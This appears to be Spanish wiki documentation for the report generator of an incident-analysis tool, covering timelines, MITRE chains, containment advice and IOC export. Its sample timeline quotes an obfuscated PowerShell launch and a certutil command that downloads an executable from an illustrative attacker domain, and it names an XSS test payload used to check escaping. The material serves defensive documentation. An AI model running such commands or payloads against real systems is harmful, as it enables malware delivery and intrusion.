# Informes

Cómo GLAMDRING convierte el grafo en un documento que se puede archivar, enviar y
defender.

---

## Deterministas, y eso es un requisito

Los informes se generan con **plantillas**, sin modelo de lenguaje detrás. En un
informe de incidente eso no es una limitación:

- La misma evidencia produce **siempre exactamente el mismo texto**. Dos analistas
  que generen el informe del mismo incidente obtienen documentos idénticos.
- Cada frase se puede rastrear hasta el evento concreto que la originó, y de ahí
  al log literal del SIEM.
- No hay nada que "se haya inventado el modelo" que discutir en una revisión.

El código vive en `glamdring/report/`:

| Fichero | Responsabilidad |
|---|---|
| `builder.py` | monta la estructura intermedia a partir del grafo y los eventos |
| `narrative.py` | convierte eventos en frases en español |
| `html.py` | fichero autocontenido, imprimible |
| `markdown.py` | para Jira, TheHive o el wiki |
| `stix.py` | STIX-lite, JSON completo y lista plana de IOCs |

**Los cuatro formatos parten del MISMO diccionario.** Ese paso intermedio evita el
problema clásico de que el HTML y el Markdown del mismo incidente acaben contando
cosas distintas porque cada uno recalcula lo suyo.

---

## Qué lleva dentro

### 1. Resumen ejecutivo

Recuento de eventos, entidades y relaciones, severidad máxima, ventana temporal con
su duración, orígenes que lo vieron y número de indicadores. El título se genera
solo a partir de las víctimas principales (*«Incidente en srv-dc01 y wks-0421»*),
porque un informe llamado «Informe de incidente» no se distingue del de la semana
pasada cuando hay cuarenta en una carpeta.

### 2. Cronología narrada

Los eventos clave, en orden, redactados en español:

```
09:15:41  jlopez ejecutó powershell.exe en wks-0421, lanzado por explorer.exe,
          con la línea de comandos «powershell.exe -nop -w hidden -enc SQBFAFgA…»
          MITRE T1027 (Obfuscated Files or Information), T1059.001 (PowerShell)

09:16:20  jlopez ejecutó certutil.exe en wks-0421, lanzado por powershell.exe,
          con la línea de comandos «certutil.exe -urlcache -split -f
          https://cdn-update-svc.com/upd.exe …»
          MITRE T1105 (Ingress Tool Transfer)

09:35:12  Falló un intento de autenticación de administrator contra srv-dc01
          desde 10.4.2.11.  ×14

09:40:55  jlopez inició sesión remota en srv-dc01 desde wks-0421, que es la
          firma del movimiento lateral.
          MITRE T1021.002 (SMB/Windows Admin Shares)
```

Dos decisiones que se notan al leerlo:

- **Solo eventos clave.** Un incidente real trae miles de eventos y casi todos son
  ruido. `is_key_event()` conserva los que tienen técnica ATT&CK asignada, los
  graves, los fallos de autenticación, las alertas y el correo: lo que un analista
  subrayaría.
- **Las repeticiones se agrupan.** Catorce fallos de login idénticos son *un*
  hecho, no catorce; escribirlos catorce veces esconde lo que vino después. Se
  colapsan en una línea con su `×14`, conservando todos los `uids`.

Si hay que recortar por longitud se conservan los más graves, pero se devuelven en
**orden cronológico**: un informe que salta en el tiempo no se entiende.

### 3. Cadena de ataque MITRE

Las tácticas detectadas en el orden de la cadena, con las entidades implicadas y
hasta tres evidencias por etapa. El orden sale de `ontology.TACTICS`, así que
siempre va de acceso inicial a impacto.

### 4. Entidades implicadas

Tabla ordenada por riesgo con tipo, papel, severidad, número de eventos, primera
aparición y qué SIEM lo vio.

### 5. Indicadores de compromiso

Ver [abajo](#indicadores-de-compromiso).

### 6. Acciones recomendadas

Derivadas de las tácticas presentes, ordenadas por prioridad. No son un plan de
respuesta completo: son las acciones de contención de primera hora.

| Táctica detectada | Prioridad | Qué dice |
|---|---|---|
| `credential-access` | 0 | asumir comprometidas **todas** las credenciales del equipo; rotar contraseñas, revocar tickets Kerberos y forzar el cambio de `krbtgt` si el volcado fue en un DC |
| `lateral-movement` | 0 | aislar origen y destino, revisar sesiones abiertas de las cuentas implicadas |
| `command-and-control` | 0 | bloquear IP y dominios en el perímetro y buscar esas conexiones en el resto de la organización |
| `exfiltration` | 0 | cuantificar el volumen y activar la notificación de brecha si hubo salida de datos |
| `impact` | 0 | verificar la integridad de las copias **antes** de restaurar, y que no fueran accesibles desde los equipos comprometidos |
| `persistence` | 1 | eliminar los mecanismos **antes** de reiniciar, o volverán a activarse |
| `defense-evasion` | 1 | la telemetría posterior a ese momento puede estar incompleta |

### 7. Captura del grafo

Solo en el HTML. Ver [abajo](#la-captura-del-grafo).

---

## Los cuatro formatos

| Formato | Cuándo usarlo |
|---|---|
| **HTML autocontenido** | el informe de archivo. Un solo fichero, sin recursos externos, con la captura del grafo incrustada en base64. Se abre en cualquier máquina, se adjunta a un correo y se imprime a PDF con `Ctrl+P`. |
| **Markdown** | para pegar en Jira, TheHive, Confluence o el wiki del SOC. |
| **JSON / STIX-lite** | para alimentar un TIP o reimportar. |
| **Lista plana de IOCs** | texto pelado, un valor por línea, para pegar en un firewall o un EDR. |

### El HTML usa tema claro a propósito

La herramienta se mira en pantalla, pero el informe se **imprime** y se lee en papel
o en PDF. Los colores de la interfaz están pensados para brillar sobre negro y
sobre papel quedan lavados, así que `html.py` tiene su propia paleta.

Todo lo que se interpola va escapado: los nombres vienen de logs, y un log puede
traer HTML dentro. Hay un test que mete `<img src=x onerror=alert(1)>` en un campo
y comprueba que sale inerte.

### El Markdown no incrusta la imagen

Un data-URL de PNG son cientos de kilobytes de base64 que ninguna de esas
herramientas renderiza bien y que hacen ilegible el diff.

### STIX-lite **no** es STIX 2.1

Se generan objetos con la **forma** de STIX (tipo, identificador, patrón, marcas de
tiempo) para que sean útiles y reconocibles, pero sin bundle firmado, sin
relaciones completas y sin el vocabulario entero. Sirve para alimentar un TIP o una
regla de bloqueo; no para presumir de cumplimiento del estándar. Decirlo aquí evita
que alguien lo asuma.

Los identificadores se derivan **del valor del indicador**, no de un UUID aleatorio:

```python
_deterministic_id("indicator", f"{kind}:{item['value']}")
```

Así, reexportar el mismo incidente no genera objetos nuevos y el TIP de destino no
acaba con duplicados.

---

## Indicadores de compromiso

`collect_iocs()` recorre el grafo y agrupa por tipo: IPs, dominios, URLs, hashes,
rutas de fichero y buzones.

**Solo salen los que apuntan hacia fuera.** Una IP RFC1918 en una lista de bloqueo
del perímetro no sirve de nada y, peor, invita a bloquear la propia red, así que las
internas se descartan explícitamente. Hay un test que lo comprueba.

Los ficheros y buzones solo entran si su papel es hostil o sospechoso: el
`informe.docx` que la víctima tenía abierto no es un indicador.

```bash
curl "http://localhost:8000/api/iocs?flat=true"
```

```
# IPs externas (2)
45.132.88.17
185.220.101.44

# Dominios (1)
cdn-update-svc.com

# Hashes SHA-256 (4)
b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90a1
…

# Buzones (1)
billing@cdn-update-svc.com
```

---

## La captura del grafo

El cliente captura el lienzo WebGL y lo manda como data-URL dentro de la petición.
Es la única forma de que la imagen acabe **dentro** del fichero HTML y este siga
siendo un solo adjunto.

Para que funcione, el renderizador se construye con `preserveDrawingBuffer: true`.
Sin eso, `toDataURL()` devuelve un lienzo en blanco: el búfer se descarta tras cada
fotograma. Y antes de capturar se fuerza un render, porque con
`preserveDrawingBuffer` lo que conserva el búfer es el **último** fotograma
dibujado, que puede ser viejo.

El servidor valida la cabecera del data-URL y su tamaño (máximo 12 MB) antes de
incrustarlo: acaba en un HTML que después circula por correo.

> **Ojo con el rendimiento.** `toDataURL()` es síncrono y bloquea el hilo principal
> mientras codifica el PNG. En un lienzo grande se nota, y con WebGL por software
> (una máquina sin GPU decente) puede tardar segundos. Es el único punto de la
> interfaz donde eso pasa.

---

## Desde la interfaz

Botón **Informe** o tecla `r`. El diálogo enseña una vista previa con el resumen,
la cadena de ataque, las primeras líneas de la cronología y las recomendaciones,
para que se vea qué va a salir antes de generarlo.

Los filtros activos en pantalla **se heredan**: si estás mirando solo severidad ≥4
en una ventana de treinta minutos, el informe habla de eso.

---

Relacionadas: [[API-Reference]] · [[Ontology]] · [[Views-and-Interaction]]
